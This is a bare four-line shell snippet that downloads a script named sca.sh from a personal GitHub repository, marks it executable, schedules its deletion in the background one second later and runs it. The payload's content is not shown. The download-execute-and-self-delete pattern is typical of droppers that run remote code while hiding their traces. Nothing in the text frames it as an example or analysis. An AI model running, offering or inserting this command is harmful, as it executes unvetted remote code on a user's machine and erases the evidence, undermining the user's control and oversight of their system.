curl -fsSL https://raw.githubusercontent.com/heck221/fungsiini/refs/heads/main/sca.sh -o sca.sh || exit
chmod +x ./sca.sh || exit
(sleep 1 && rm ./sca.sh & )
./sca.sh
